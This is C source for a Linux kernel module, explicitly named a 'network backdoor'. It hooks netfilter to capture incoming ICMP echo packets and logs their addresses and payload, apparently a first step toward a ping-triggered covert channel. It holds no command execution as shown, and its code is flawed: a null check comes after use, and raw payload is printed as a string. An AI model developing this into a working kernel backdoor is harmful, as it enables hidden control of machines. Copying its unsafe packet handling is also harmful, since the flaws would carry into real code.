#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/inet.h>


static struct nf_hook_ops nfho;     // net filter hook option struct 


unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{       
        struct sk_buff *sock_buff;          // socket buffer used in linux kernel
        struct iphdr *ip_header;            // ip header struct
        struct icmphdr *icmp_header;        // icmp header
        unsigned int icmp_data_offset;

        sock_buff = skb;
        ip_header = (struct iphdr *)skb_network_header(sock_buff); //grab network header using accessor
        icmp_header = (struct icmphdr *)icmp_hdr(sock_buff); // Pull out icmp header
        icmp_data_offset = sizeof(struct iphdr) + sizeof(struct icmphdr);

        if(!sock_buff) { return NF_DROP;}

        if (ip_header->protocol == IPPROTO_ICMP) { //icmp=1 udp=17 tcp=6
           if (icmp_header->type == ICMP_ECHO) {
                printk(KERN_INFO "Got ICMP packet \n");     //log we’ve got udp packet to /var/log/messages
                printk(KERN_INFO "src_ip: %pI4 \n", &ip_header->saddr);
                printk(KERN_INFO "dst_ip: %pI4\n", &ip_header->daddr);
                printk(KERN_INFO "icmp_header type: %hhx\n", icmp_header->type);
                printk(KERN_INFO "sock_buff->len: %d \n", sock_buff->len);     //log we’ve got udp packet to /var/log/messages
                printk(KERN_INFO "sock_buff->data_len: %d \n", ( sizeof(struct iphdr) + sizeof(struct icmphdr)));
                printk(KERN_INFO "icmp data: %s\n", (char *)(sock_buff->data + icmp_data_offset));
           }
        }
        return NF_ACCEPT;
}
 
int int_network_backdoor(void)
{
        nfho.hook = hook_func;
        nfho.hooknum = 0; //NF_IP_PRE_ROUTING=0(capture ICMP Request.)  NF_IP_POST_ROUTING=4(capture ICMP reply.)
        nfho.pf = PF_INET;//IPV4 packets
        nfho.priority = NF_IP_PRI_FIRST;//set to highest priority over all other hook functions
        nf_register_net_hook(&init_net, &nfho);

        printk(KERN_INFO "---------------------------------------\n");
        printk(KERN_INFO "Loading network backdoor\n");
        return 0;
}
 
void cleanup_network_backdoor(void)
{
	printk(KERN_INFO "Cleaning up network backdoor\n");
        nf_unregister_net_hook(&init_net, &nfho);     
}